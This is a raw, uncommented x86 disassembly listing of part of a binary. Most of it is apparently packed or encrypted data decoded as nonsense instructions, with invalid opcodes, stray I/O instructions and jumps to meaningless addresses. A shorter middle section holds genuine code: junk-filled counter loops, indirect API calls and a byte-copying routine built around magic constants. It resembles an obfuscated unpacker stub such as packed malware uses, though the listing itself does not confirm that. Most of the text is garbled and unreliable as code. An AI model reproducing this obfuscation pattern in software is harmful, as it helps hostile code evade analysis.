  407fb8:	push   0x66
  407fba:	jecxz  0x407f4e
  407fbc:	data16 jb 0x407f72
  407fbf:	sub    bl,dl
  407fc1:	fucomi st,st(5)
  407fc3:	jne    0x407f46
  407fc5:	test   ch,0xda
  407fc8:	or     eax,DWORD PTR [eax-0x7dfd57c4]
  407fce:	cmp    DWORD PTR [edx-0x3e],eax
  407fd1:	jbe    0x407f5e
  407fd3:	mov    ds:0x567ebca8,al
  407fd8:	mov    ch,0x93
  407fda:	add    eax,DWORD PTR [ebp+0x1c5f40da]
  407fe0:	adc    eax,0xbec296ca
  407fe5:	sbb    DWORD PTR [eax-0x3b],ecx
  407fe8:	test   eax,0xf81d65e8
  407fed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fee:	hlt    
  407fef:	add    BYTE PTR [eax+eax*8+0x5a],dh
  407ff3:	data16 addr16 fs jg 0x408071
  407ff8:	fbld   TBYTE PTR [edx-0x34a642a0]
  407ffe:	aaa    
  407fff:	ja     0x40805a
  408001:	stos   DWORD PTR es:[edi],eax
  408002:	cli    
  408003:	aam    0xa8
  408005:	dec    ebp
  408006:	mov    esp,0x96d89c06
  40800b:	sbb    eax,0x1c2e877c
  408010:	and    eax,0xad11eb28
  408015:	jmp    0x90e32ccd
  40801a:	pop    ebx
  40801b:	mov    dh,0x59
  40801d:	je     0x40808c
  40801f:	push   ebx
  408020:	je     0x407fac
  408022:	jmp    0x43b3:0x3ccc5c94
  408029:	in     eax,0x9
  40802b:	jmp    0x50a343c8
  408030:	js     0x40801a
  408032:	mov    bh,BYTE PTR [ebx-0x7]
  408035:	inc    ecx
  408036:	arpl   WORD PTR [edx],cx
  408038:	push   ecx
  408039:	test   eax,0x27d09fd5
  40803e:	(bad)  
  40803f:	repz xlat BYTE PTR ds:[ebx]
  408041:	cdq    
  408042:	out    0xad,al
  408044:	icebp  
  408045:	sar    DWORD PTR [ebx+edi*1-0x3b00f9d1],cl
  40804c:	push   es
  40804d:	test   edi,ebp
  40804f:	retf   0x105
  408052:	out    0xb,eax
  408054:	adc    eax,0x487ff35a
  408059:	inc    edx
  40805a:	aad    0x66
  40805c:	sbb    BYTE PTR [esi],dl
  40805e:	pop    ds
  40805f:	out    dx,al
  408060:	mov    esi,0x9bf871e7
  408065:	xchg   esp,eax
  408066:	fadd   st(2),st
  408068:	jmp    0x5f63:0x3dbb5233
  40806f:	and    eax,0xda5cf689
  408074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408075:	iret   
  408076:	call   0xe6b4:0x467c176d
  40807d:	and    al,0xe3
  40807f:	mov    ds:0xe321571c,al
  408084:	xor    eax,0xdc431ac8
  408089:	loop   0x40807a
  40808b:	add    BYTE PTR [ecx],ch
  40808d:	nop
  40808e:	sahf   
  40808f:	and    ah,BYTE PTR [ebx+ebp*4+0x53]
  408093:	es mov bh,0xf2
  408096:	mov    ds:0x8986e4e0,eax
  40809b:	add    edi,DWORD PTR [ebx+edi*1+0x67]
  40809f:	mov    bh,dl
  4080a1:	out    dx,eax
  4080a2:	div    bh
  4080a4:	fidiv  WORD PTR [ebx+0x59e27e0a]
  4080aa:	daa    
  4080ab:	xchg   esi,eax
  4080ac:	xchg   ecx,eax
  4080ad:	sbb    DWORD PTR [eax-0x46],0x8f77d699
  4080b4:	pop    ecx
  4080b5:	into   
  4080b6:	mov    ah,0xf6
  4080b8:	mul    DWORD PTR [edi+0x24]
  4080bb:	mov    DWORD PTR [ebp-0x1e],esi
  4080be:	jmp    0x858589a0
  4080c3:	pop    ebx
  4080c4:	jne    0x40807d
  4080c6:	aaa    
  4080c7:	test   al,0x78
  4080c9:	out    0xdf,eax
  4080cb:	in     al,0x1f
  4080cd:	stc    
  4080ce:	push   0x34
  4080d0:	jne    0x408053
  4080d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080d3:	in     al,0x9a
  4080d5:	fwait
  4080d6:	jp     0x40808b
  4080d8:	into   
  4080d9:	cld    
  4080da:	mov    ebp,0xfd957ddd
  4080df:	inc    ebx
  4080e0:	scas   eax,DWORD PTR es:[edi]
  4080e1:	cli    
  4080e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080e3:	xor    BYTE PTR [esi],bl
  4080e5:	mov    dh,dh
  4080e7:	(bad)  
  4080e8:	jp     0x4080ec
  4080ea:	cmp    al,0x71
  4080ec:	in     al,0x85
  4080ee:	data16 add al,0x57
  4080f1:	mov    esp,0x8cd0d288
  4080f6:	bound  edx,QWORD PTR [edx+esi*1-0x3ff7e18c]
  4080fd:	push   edi
  4080fe:	mov    eax,ds:0x112803c2
  408103:	push   eax
  408104:	and    BYTE PTR [ecx],dl
  408106:	int3   
  408107:	(bad)  
  408109:	push   ebx
  40810a:	test   DWORD PTR [eax+0x62],edx
  40810d:	sbb    eax,0x58900a0e
  408112:	icebp  
  408113:	fisubr DWORD PTR ds:0xd4601321
  408119:	and    al,dl
  40811b:	or     ebx,DWORD PTR [esi-0x6d]
  40811e:	inc    BYTE PTR [edi]
  408120:	push   edi
  408121:	jg     0x408198
  408123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408124:	mov    al,ds:0x9c47a257
  408129:	push   0x340fd49e
  40812e:	mov    al,ds:0x5057d2cd
  408133:	in     eax,dx
  408134:	pop    ecx
  408135:	jb     0x408163
  408137:	push   ebx
  408138:	sbb    ebp,0xffffffd0
  40813b:	(bad)  
  40813c:	mov    cl,0x92
  40813e:	es clc 
  408140:	cmp    al,0xd6
  408142:	stos   BYTE PTR es:[edi],al
  408143:	(bad)  
  408144:	xchg   edi,eax
  408145:	mov    ch,0x2
  408147:	aaa    
  408148:	dec    esi
  408149:	retf   0x2bd6
  40814c:	cmp    BYTE PTR [ebx],bl
  40814e:	and    eax,0x7641f060
  408153:	pop    eax
  408154:	ins    BYTE PTR es:[edi],dx
  408155:	push   0x56aead29
  40815a:	sbb    eax,0x5e3bb947
  40815f:	mov    ebp,0xe88e46c5
  408164:	and    eax,0xb29c630d
  408169:	pop    edi
  40816a:	mov    al,0x1f
  40816c:	add    BYTE PTR [ecx],ah
  40816e:	xor    BYTE PTR [esi],bh
  408170:	out    0x6c,eax
  408172:	jne    0x40816c
  408174:	add    ebx,DWORD PTR [ecx-0x4785e031]
  40817a:	(bad)  
  40817b:	push   esp
  40817c:	bound  edi,QWORD PTR [esi+0x4b42fce8]
  408182:	(bad)  
  408183:	cmp    dl,BYTE PTR [ebp+0x68]
  408186:	fmul   st(1),st
  408188:	imul   esp,DWORD PTR [edi+0x629821d5],0x16
  40818f:	out    dx,eax
  408190:	call   0x3962f281
  408195:	sbb    esp,esp
  408197:	iret   
  408198:	cwde   
  408199:	mov    esp,0x1b6f50e4
  40819e:	sub    eax,0xd7f54b01
  4081a3:	cvtps2pd xmm2,QWORD PTR [ebx+eax*2-0x3e]
  4081a8:	pop    ebx
  4081a9:	repnz adc al,0xad
  4081ac:	sub    dl,BYTE PTR [edx+0x5c]
  4081af:	daa    
  4081b0:	xchg   edi,eax
  4081b1:	mov    WORD PTR [ebx+eax*8],ds
  4081b4:	lock mov ch,0xf8
  4081b7:	lds    eax,FWORD PTR [edi+ebx*4]
  4081ba:	add    BYTE PTR [ebx],dh
  4081bc:	cmp    eax,DWORD PTR [ecx+0x361ae842]
  4081c2:	adc    eax,ebp
  4081c4:	sbb    ecx,eax
  4081c6:	cld    
  4081c7:	dec    ecx
  4081c8:	outs   dx,DWORD PTR ds:[esi]
  4081c9:	es push cs
  4081cb:	sbb    BYTE PTR [ebx+0x17ed2f0f],ah
  4081d1:	sbb    BYTE PTR [ebp-0x7a],dl
  4081d4:	fadd   DWORD PTR [esi]
  4081d6:	cmp    BYTE PTR [ebp-0xd],cl
  4081d9:	inc    esi
  4081da:	jmp    0x408194
  4081dc:	je     0x40822f
  4081de:	fcmovbe st,st(0)
  4081e0:	push   0x26
  4081e2:	stos   BYTE PTR es:[edi],al
  4081e3:	pushf  
  4081e4:	jno    0x4081cd
  4081e6:	add    BYTE PTR [ebp+0x9781678],bh
  4081ec:	cmp    BYTE PTR [esi],dh
  4081ee:	or     BYTE PTR [edx],dl
  4081f0:	xchg   BYTE PTR [ecx-0x4c7abcfd],bh
  4081f6:	enter  0xc782,0x73
  4081fa:	loope  0x4081b4
  4081fc:	inc    ebp
  4081fd:	mov    eax,ds:0xfeca46ea
  408202:	jg     0x40819f
  408204:	sti    
  408205:	stos   BYTE PTR es:[edi],al
  408206:	pop    esp
  408207:	je     0x408238
  408209:	js     0x4081aa
  40820b:	add    ah,BYTE PTR gs:[esi]
  40820e:	mov    WORD PTR [ebx-0xa8063a4],gs
  408214:	cmp    BYTE PTR [ecx+0x236f1e5],al
  40821a:	jle    0x408241
  40821c:	mov    cs,WORD PTR [ecx+ecx*8+0x17c9f415]
  408223:	xor    edi,eax
  408225:	fcmovbe st,st(3)
  408227:	sub    esi,esi
  408229:	push   es
  40822a:	iret   
  40822b:	xchg   esp,eax
  40822c:	popf   
  40822d:	add    esp,DWORD PTR [ecx]
  40822f:	add    eax,0x37db3002
  408234:	dec    ecx
  408235:	jmp    0x2e44:0x9ebf5eb3
  40823c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40823d:	jnp    0x408293
  40823f:	mov    eax,ds:0xab1c27a1
  408244:	fiadd  DWORD PTR [esi+0x3e]
  408247:	cmp    bl,BYTE PTR [eax+0x1]
  40824a:	shr    DWORD PTR [ecx-0x57],1
  40824d:	or     al,0xdb
  40824f:	sub    ebx,DWORD PTR [ecx]
  408251:	inc    edx
  408252:	test   DWORD PTR [eax+0x7a],ebx
  408255:	pop    ss
  408256:	(bad)  
  408258:	push   eax
  408259:	inc    edi
  40825a:	adc    al,0x87
  40825c:	dec    edi
  40825d:	pop    eax
  40825e:	into   
  40825f:	cmp    eax,0x971c0a62
  408264:	call   FWORD PTR [eax+0x36e5cb81]
  40826a:	(bad)  
  40826b:	and    edi,ebx
  40826d:	sub    bl,dl
  40826f:	adc    al,0x4
  408271:	fnstsw WORD PTR [eax-0x74]
  408274:	or     DWORD PTR [ecx+0xf],esi
  408277:	mov    ecx,0x79e6bf49
  40827c:	jne    0x4082f4
  40827e:	(bad)  
  40827f:	idiv   edx
  408281:	push   ds
  408282:	lock mov esi,0xbd302eef
  408288:	push   0xb6615215
  40828d:	aaa    
  40828e:	js     0x40828d
  408290:	adc    DWORD PTR [esi-0x6d],esp
  408293:	loopne 0x40829e
  408295:	out    dx,al
  408296:	out    0xd0,al
  408298:	inc    ebp
  408299:	jno    0x408271
  40829b:	jne    0x408315
  40829d:	iret   
  40829e:	inc    edx
  40829f:	mov    dl,0xc3
  4082a1:	sar    BYTE PTR [esi-0x2f63bc43],cl
  4082a7:	sbb    eax,0xd4bd55db
  4082ac:	popa   
  4082ad:	mov    esp,0xbf94bea7
  4082b2:	jl     0x408235
  4082b4:	sub    DWORD PTR [edi+0x57],edx
  4082b7:	shr    BYTE PTR [ebp+0x425d2102],0xa3
  4082be:	jae    0x4082b0
  4082c0:	inc    esp
  4082c1:	jg     0x4082f2
  4082c3:	mov    edx,0x406cf7e4
  4082c8:	mov    ch,0x2
  4082ca:	push   ds
  4082cb:	jno    0x4082db
  4082cd:	inc    ebp
  4082ce:	in     al,dx
  4082cf:	sub    esp,DWORD PTR [esi]
  4082d1:	ss push 0x6f1a0ff8
  4082d7:	dec    ebp
  4082d8:	mov    esp,DWORD PTR [esi-0x2bf8a13f]
  4082de:	stos   BYTE PTR es:[edi],al
  4082df:	pop    ebx
  4082e0:	je     0x40831e
  4082e2:	or     bh,BYTE PTR [edi+0x7c]
  4082e5:	jae    0x408329
  4082e7:	jae    0x408292
  4082e9:	out    dx,eax
  4082ea:	and    eax,0xc7dcfe64
  4082ef:	mov    al,ds:0xccfa90cc
  4082f4:	jae    0x408371
  4082f6:	out    dx,eax
  4082f7:	jne    0x40827f
  4082f9:	pushf  
  4082fa:	pop    eax
  4082fb:	das    
  4082fc:	ret    0x39f
  4082ff:	ins    BYTE PTR es:[edi],dx
  408300:	mov    bh,dl
  408302:	dec    esp
  408303:	pusha  
  408304:	cwde   
  408305:	iret   
  408306:	adc    esp,ebx
  408308:	jge    0x408375
  40830a:	cdq    
  40830b:	adc    DWORD PTR [eax],0x9b1b635e
  408311:	scas   eax,DWORD PTR es:[edi]
  408312:	sub    ah,bl
  408314:	fsub   DWORD PTR [edi+eiz*1-0x25eababa]
  40831b:	mov    dh,0xa9
  40831d:	xor    al,BYTE PTR [ebx+0x4b]
  408320:	cli    
  408321:	cmp    eax,0xa88d70e2
  408326:	inc    ebp
  408327:	mov    WORD PTR [edx],?
  408329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40832a:	cli    
  40832b:	push   edi
  40832c:	pop    ds
  40832d:	pop    edi
  40832e:	sbb    esp,ecx
  408330:	call   0x62665cba
  408335:	adc    edi,0xa536ae75
  40833b:	ins    DWORD PTR es:[edi],dx
  40833c:	addr16 push 0xc
  40833f:	add    BYTE PTR [eax+0x123bc9ae],0xc3
  408346:	push   ds
  408347:	sbb    dl,BYTE PTR [ebp+0x1]
  40834a:	pop    ebp
  40834b:	cmp    al,0xcc
  40834d:	xor    al,0x25
  40834f:	adc    ah,BYTE PTR [esi-0x78a24ebd]
  408355:	outs   dx,BYTE PTR ds:[esi]
  408356:	shl    BYTE PTR [ecx-0x2c],1
  408359:	jno    0x408389
  40835b:	cmp    dh,BYTE PTR [esp+ecx*2-0x2eb48798]
  408362:	in     eax,0x31
  408364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408365:	popf   
  408366:	xor    BYTE PTR [edi+0x35],bl
  408369:	inc    edx
  40836a:	push   DWORD PTR [ebx]
  40836c:	test   eax,0x692664b0
  408371:	fild   DWORD PTR [edi]
  408373:	pop    esp
  408374:	jl     0x4082fb
  408376:	jbe    0x40830c
  408378:	and    edx,DWORD PTR [ebx+0x68]
  40837b:	pop    ebp
  40837c:	mov    dl,0xed
  40837e:	gs adc eax,0xd0395813
  408384:	lds    eax,FWORD PTR [ecx+eiz*1-0x53]
  408388:	push   es
  408389:	mov    bl,0x72
  40838b:	sub    BYTE PTR [eax-0x3d],bh
  40838e:	in     al,dx
  40838f:	adc    dl,cl
  408391:	not    BYTE PTR [esp+edi*4]
  408394:	push   es
  408395:	dec    edi
  408396:	push   edi
  408397:	loopne 0x408382
  408399:	pop    ebp
  40839a:	mul    DWORD PTR [esp+eiz*4]
  40839d:	and    al,0xe8
  40839f:	fisttp QWORD PTR [edx+ebp*4-0x63237033]
  4083a6:	lock int3 
  4083a8:	jns    0x408392
  4083aa:	imul   ecx,esi,0xf74bf9fa
  4083b0:	hlt    
  4083b1:	cmp    edx,DWORD PTR [esi]
  4083b3:	shr    DWORD PTR [edx-0x47],0x3a
  4083b7:	adc    eax,0x53ecb730
  4083bc:	mov    BYTE PTR [edx+0x476da399],0x70
  4083c3:	rcl    BYTE PTR [ecx],0xd8
  4083c6:	mov    bl,0x17
  4083c8:	out    0xd2,al
  4083ca:	add    dl,BYTE PTR [eax]
  4083cc:	xor    al,0x6f
  4083ce:	dec    ecx
  4083cf:	mov    bh,0x9d
  4083d1:	retf   
  4083d2:	mov    eax,0xe9100b13
  4083d7:	push   ds
  4083d8:	jne    0x40839c
  4083da:	jbe    0x4083bd
  4083dc:	aas    
  4083dd:	cmp    BYTE PTR [eax-0x754d5eee],ah
  4083e3:	mov    dl,0x60
  4083e5:	lock gs push edi
  4083e8:	pop    esi
  4083e9:	sub    al,0x57
  4083eb:	sub    ch,ah
  4083ed:	fisttp DWORD PTR [eax-0x7a]
  4083f0:	(bad)  [esi]
  4083f2:	ja     0x4083ec
  4083f4:	dec    edx
  4083f5:	dec    eax
  4083f6:	pop    ecx
  4083f7:	aam    0x8e
  4083f9:	js     0x408408
  4083fb:	leave  
  4083fc:	push   0x6c
  4083fe:	pop    es
  4083ff:	and    bl,dl
  408401:	add    BYTE PTR [ebp+0x32],dh
  408404:	(bad)  
  408405:	shl    BYTE PTR [ebx-0x36],1
  408408:	mov    eax,ds:0x75b67386
  40840d:	pop    esi
  40840e:	pop    ebx
  40840f:	leave  
  408410:	ret    0xc
  408413:	push   ebp
  408414:	mov    ebp,esp
  408416:	mov    DWORD PTR ds:0x42411a,0xf89c85b5
  408420:	mov    DWORD PTR ds:0x42a00c,0x7dd6
  40842a:	pop    ebp
  40842b:	jmp    0x41b7a1
  408430:	xor    eax,eax
  408432:	or     DWORD PTR ds:0x42b010,0x429008
  40843c:	inc    eax
  40843d:	ret    
  40843e:	push   ebp
  40843f:	mov    ebp,esp
  408441:	sub    esp,0x10
  408444:	sbb    ecx,DWORD PTR ds:0x42d008
  40844a:	mov    eax,0xf89c85b6
  40844f:	mov    edx,DWORD PTR ds:0x42b000
  408455:	add    DWORD PTR ds:0x42c018,edx
  40845b:	mov    DWORD PTR [ebp-0x4],eax
  40845e:	dec    edx
  40845f:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  408466:	mov    DWORD PTR ds:0x42b01c,0x18
  408470:	cmp    DWORD PTR ds:0x42b01c,0x0
  408477:	je     0x4084ad
  40847d:	cmp    DWORD PTR ds:0x42b01c,0x1b
  408484:	jne    0x40849b
  40848a:	push   DWORD PTR [ebp-0x28]
  40848d:	push   0x7565
  408492:	push   DWORD PTR [ebp-0x18]
  408495:	call   DWORD PTR ds:0x425040
  40849b:	mov    edx,DWORD PTR ds:0x42b01c
  4084a1:	dec    edx
  4084a2:	mov    DWORD PTR ds:0x42b01c,edx
  4084a8:	jmp    0x408470
  4084ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4084b0:	xor    edx,DWORD PTR ds:0x42b008
  4084b6:	push   esi
  4084b7:	mov    DWORD PTR ds:0x42c000,0x17
  4084c1:	cmp    DWORD PTR ds:0x42c000,0x0
  4084c8:	je     0x408518
  4084ce:	cmp    DWORD PTR ds:0x42c000,0xa
  4084d5:	jne    0x4084ec
  4084db:	push   0x8fa2
  4084e0:	push   DWORD PTR [ebp-0x24]
  4084e3:	push   DWORD PTR [ebp-0xc]
  4084e6:	call   DWORD PTR ds:0x425044
  4084ec:	cmp    DWORD PTR ds:0x42c000,0xb
  4084f3:	jne    0x408506
  4084f9:	mov    edx,DWORD PTR ds:0x42c000
  4084ff:	dec    edx
  408500:	mov    DWORD PTR ds:0x42c000,edx
  408506:	mov    edx,DWORD PTR ds:0x42c000
  40850c:	dec    edx
  40850d:	mov    DWORD PTR ds:0x42c000,edx
  408513:	jmp    0x4084c1
  408518:	mov    edx,0x7510893
  40851d:	xor    ecx,edx
  40851f:	and    DWORD PTR ds:0x429018,0x2759
  408529:	mov    esi,0x3272db
  40852e:	mov    DWORD PTR ds:0x42b01c,0x64d9
  408538:	push   edi
  408539:	mov    DWORD PTR ds:0x42c000,0x1c
  408543:	cmp    DWORD PTR ds:0x42c000,0x0
  40854a:	je     0x4085a2
  408550:	cmp    DWORD PTR ds:0x42c000,0xb
  408557:	jne    0x408573
  40855d:	push   DWORD PTR [ebp-0xc]
  408560:	push   DWORD PTR [ebp-0x10]
  408563:	push   0x6908
  408568:	push   0x2a1a
  40856d:	call   DWORD PTR ds:0x425048
  408573:	cmp    DWORD PTR ds:0x42c000,0xc
  40857a:	jne    0x40858f
  408580:	xor    edi,edi
  408582:	xor    edi,DWORD PTR ds:0x42c000
  408588:	dec    edi
  408589:	mov    DWORD PTR ds:0x42c000,edi
  40858f:	mov    edi,DWORD PTR ds:0x42c000
  408595:	dec    edi
  408596:	mov    DWORD PTR ds:0x42c000,edi
  40859c:	jmp    0x408543
  4085a1:	dec    edi
  4085a2:	mov    edi,DWORD PTR [ebp+0x10]
  4085a5:	xor    DWORD PTR ds:0x429004,0x6210
  4085af:	add    ecx,esi
  4085b1:	cmp    ecx,edi
  4085b3:	je     0x408678
  4085b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4085bc:	mov    edi,DWORD PTR [ebp+0x10]
  4085bf:	xor    eax,eax
  4085c1:	xor    ecx,edx
  4085c3:	add    ecx,esi
  4085c5:	add    edi,0xfabdbef1
  4085cb:	adc    eax,0xffffffff
  4085ce:	xor    eax,0x0
  4085d1:	mov    DWORD PTR [ebp-0xc],eax
  4085d4:	push   ebx
  4085d5:	xor    ebx,ebx
  4085d7:	xor    edi,0x8a29a123
  4085dd:	mov    eax,ecx
  4085df:	add    eax,0xfabdbef1
  4085e4:	adc    ebx,0xffffffff
  4085e7:	xor    eax,0x8a29a123
  4085ec:	xor    ebx,0x0
  4085ef:	cmp    eax,edi
  4085f1:	jne    0x40860a
  4085f7:	cmp    ebx,DWORD PTR [ebp-0xc]
  4085fa:	je     0x408672
  408600:	jmp    0x40860a
  408605:	mov    esi,0x3272db
  40860a:	mov    eax,DWORD PTR [ebp-0x4]
  40860d:	mov    edi,DWORD PTR [ebp-0x8]
  408610:	xor    edi,edx
  408612:	add    edi,esi
  408614:	mov    esi,DWORD PTR [ebp+0x8]
  408617:	imul   edi,ecx
  40861a:	mov    ebx,DWORD PTR [ebp+0xc]
  40861d:	xor    eax,edx
  40861f:	add    eax,ecx
  408621:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  408628:	mov    BYTE PTR [edi+esi*1],al
  40862b:	mov    eax,DWORD PTR [ebp-0x8]
  40862e:	mov    esi,DWORD PTR [ebp+0x10]
  408631:	xor    eax,edx
  408633:	xor    ebx,ebx
  408635:	add    esi,0xfabdbef1
  40863b:	adc    ebx,0xffffffff
  40863e:	lea    ecx,[ecx+eax*1+0x3272db]
  408645:	xor    edi,edi
  408647:	xor    esi,0x8a29a123
  40864d:	xor    ebx,0x0
  408650:	mov    eax,ecx
  408652:	add    eax,0xfabdbef1
  408657:	adc    edi,0xffffffff
  40865a:	xor    eax,0x8a29a123
  40865f:	xor    edi,0x0
  408662:	cmp    eax,esi
  408664:	jne    0x408605
  40866a:	cmp    edi,ebx
  40866c:	jne    0x408605
  408672:	mov    eax,0xf89c85b5
  408677:	pop    ebx
  408678:	pop    edi
  408679:	pop    esi
  40867a:	leave  
  40867b:	ret    0xc
  40867e:	push   ebp
  40867f:	mov    ebp,esp
  408681:	sub    esp,0x78
  408684:	adc    DWORD PTR ds:0x429000,0x42d00c
  40868e:	push   ebx
  40868f:	or     DWORD PTR ds:0x42d000,0x5016
  408699:	push   esi
  40869a:	sbb    DWORD PTR ds:0x42d008,0x6d64
  4086a4:	push   edi
  4086a5:	push   0x1f
  4086a7:	and    DWORD PTR ds:0x42d018,0x1f4a
  4086b1:	lea    eax,[ebp-0x78]
  4086b4:	push   eax
  4086b5:	not    DWORD PTR ds:0x42c008
  4086bb:	push   0x0
  4086bd:	xor    DWORD PTR ds:0x429008,0x2961
  4086c7:	jmp    0x40aa2c
  4086cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086cd:	xchg   esi,eax
  4086ce:	sub    edx,ebp
  4086d0:	out    0x65,eax
  4086d2:	arpl   WORD PTR [ebx+eiz*8+0x231a558d],dx
  4086d9:	or     DWORD PTR [ecx+0x6218504d],esp
  4086df:	bound  edi,QWORD PTR [edx]
  4086e1:	pop    edi
  4086e2:	bound  esp,QWORD PTR [edx-0x12]
  4086e5:	cmp    BYTE PTR [edx+ebp*8-0x3f8bb19f],0x7e
  4086ed:	gs ds ins BYTE PTR es:[edi],dx
  4086f0:	test   BYTE PTR [eax-0x7c],bl
  4086f3:	sahf   
  4086f4:	in     al,0xda
  4086f6:	sub    bh,ah
  4086f8:	push   edx
  4086f9:	cld    
  4086fa:	or     eax,0x9074e308
  4086ff:	or     eax,esp
  408701:	out    0x1,al
  408703:	pop    esp
  408704:	cli    
  408705:	popf   
  408706:	inc    esp
  408707:	cmp    esi,DWORD PTR [ebp+0x10]
  40870a:	shl    BYTE PTR [ecx+ebp*1],1
  40870d:	push   ebp
  40870e:	or     eax,edx
  408710:	test   DWORD PTR [eax],edi
  408712:	or     esp,DWORD PTR [ebp+0x620656aa]
  408718:	stos   BYTE PTR es:[edi],al
  408719:	xchg   esi,eax
  40871a:	cmp    DWORD PTR [edx+0x471753c9],ebx
  408720:	jo     0x408787
  408722:	int    0x80
  408724:	adc    dh,BYTE PTR [edx]
  408726:	repz es jbe 0x40878c
  40872a:	push   DWORD PTR [edx]
  40872c:	jmp    0x4086c8
  40872e:	and    BYTE PTR gs:[eax+0x2ecfdf60],cl
  408735:	in     eax,0x6e
  408737:	pop    ecx
  408738:	out    dx,al
  408739:	shl    DWORD PTR [edx+esi*2-0x7d619a29],1
  408740:	or     BYTE PTR [esi],dl
  408742:	addr16 mov cl,0xa7
  408746:	add    ebx,0x3c
  408749:	or     BYTE PTR [ebx-0xd],ah
  40874c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40874d:	jno    0x408759
  40874f:	add    BYTE PTR [ebp+eiz*4+0x560b516d],al
  408756:	cmp    al,0xa
  408759:	in     al,dx
  40875a:	xchg   esp,eax
  40875b:	rol    ch,cl
  40875d:	dec    ebp
  40875e:	aaa    
  40875f:	sbb    al,0xd0
  408761:	jno    0x408714
  408763:	test   al,0xd6
  408765:	scas   eax,DWORD PTR es:[edi]
  408766:	jmp    0x1064:0x950e47d5
  40876d:	pushf  
  40876e:	xlat   BYTE PTR ds:[ebx]
  40876f:	(bad)  
  408770:	mov    dl,0x6b
  408772:	ins    DWORD PTR es:[edi],dx
  408773:	sbb    cl,0x1d
  408776:	test   cl,bl
  408778:	mov    bh,0x51
  40877a:	call   0x3f33:0xfb4e18fd
  408781:	push   ds
  408782:	adc    DWORD PTR [ecx-0x36a34fbe],esp
  408788:	ds ss mov ebp,0x7d7a320a
  40878f:	arpl   WORD PTR [edi-0x71ab5a79],bx
  408795:	pop    esp
  408796:	mov    ecx,DWORD PTR [eax]
  408798:	test   al,0x50
  40879a:	icebp  
  40879b:	pop    es
  40879c:	lods   eax,DWORD PTR ds:[esi]
  40879d:	jno    0x4087a6
  40879f:	add    DWORD PTR [ebx+0xc],edx
  4087a2:	xchg   esi,eax
  4087a3:	js     0x408810
  4087a5:	push   0x6f
  4087a7:	dec    eax
  4087a8:	jle    0x4087c3
  4087aa:	add    ebx,ebp
  4087ac:	stc    
  4087ad:	or     bh,BYTE PTR [eax+0x265ee54]
  4087b3:	cmp    DWORD PTR [esi+0x5c5471],0x606d812c
  4087bd:	jns    0x4087e5
  4087bf:	retf   0xa905
  4087c2:	cmp    eax,0x7d0ba24e
  4087c7:	call   0xac36:0x9fa284f7
  4087ce:	scas   eax,DWORD PTR es:[edi]
  4087cf:	push   edx
  4087d0:	sbb    DWORD PTR [edi+esi*8],ebp
  4087d3:	add    ecx,DWORD PTR [edx+0x68]
  4087d6:	cdq    
  4087d7:	in     eax,dx
  4087d8:	rcl    DWORD PTR [edx-0x31],1
  4087db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087dc:	stc    
  4087dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087de:	int3   
  4087df:	cmp    DWORD PTR [edi+0x479a016f],ebp
  4087e5:	inc    edi
  4087e6:	sub    esi,DWORD PTR [esi+edi*8+0x5ce3c505]
  4087ed:	ss loope 0x4087ff
  4087f0:	dec    ecx
  4087f1:	ss jbe 0x4087d0
  4087f4:	xor    BYTE PTR [ebx],dl
  4087f6:	xchg   ecx,eax
  4087f7:	and    BYTE PTR [ecx+0x400682b1],ch
  4087fd:	dec    ebx
  4087fe:	cdq    
  4087ff:	js     0x4087a3
  408801:	jge    0x4087aa
  408803:	pop    edx
  408804:	or     ebx,DWORD PTR [edx-0x74]
  408807:	push   edx
  408808:	jg     0x408849
  40880a:	or     bl,dl
  40880c:	jg     0x40881f
  40880e:	into   
  40880f:	pop    es
  408810:	cmp    ebx,DWORD PTR [eax+0x2e]
  408813:	in     eax,0x99
  408815:	add    eax,0x63ad415c
  40881a:	das    
  40881b:	fs in  al,dx
  40881d:	fs add al,0xf2
  408820:	mov    ah,0xf4
  408822:	mov    WORD PTR ds:[edx-0x48],es
  408826:	adc    BYTE PTR [ebp+0x6a],0xbf
  40882a:	add    esp,DWORD PTR [edx]
  40882c:	enter  0xa2e7,0xd8
  408830:	dec    esi
  408831:	inc    edi
  408832:	or     al,0x3d
  408834:	arpl   di,bp
  408836:	cmp    BYTE PTR [ecx],dl
  408838:	mov    ebp,0x71a0819c
  40883d:	xor    DWORD PTR [eax-0x52dcabc4],esi
  408843:	mov    ch,0xe3
  408845:	out    dx,al
  408846:	or     dl,BYTE PTR [ecx+edx*8]
  408849:	das    
  40884a:	jbe    0x408897
  40884c:	outs   dx,BYTE PTR ds:[esi]
  40884d:	jmp    0x408823
  40884f:	imul   ecx,DWORD PTR ds:0xe0aa1aac,0xffffffc7
  408856:	lds    edi,FWORD PTR [edx]
  408858:	lds    esp,FWORD PTR [ebx]
  40885a:	aam    0x8f
  40885c:	mov    al,0x16
  40885e:	out    0x50,al
  408860:	jg     0x408887
  408862:	std    
  408863:	push   esp
  408864:	lahf   
  408865:	add    BYTE PTR [edx],al
  408867:	fld    DWORD PTR [eax]
  408869:	or     ah,BYTE PTR [ebx+0x5e86df4f]
  40886f:	or     al,0x6b
  408871:	daa    
  408872:	add    bl,BYTE PTR [ecx+0x2efff4fe]
  408878:	inc    edx
  408879:	sbb    ah,BYTE PTR [edx]
  40887b:	imul   esi,DWORD PTR [ebx-0x77],0x7576115f
  408882:	xor    al,0x4
  408884:	push   cs
  408885:	adc    al,0xde
  408887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408888:	mov    dl,bl
  40888a:	icebp  
  40888b:	inc    edi
  40888c:	xchg   ebp,ebp
  40888e:	out    dx,eax
  40888f:	rol    DWORD PTR [eax],1
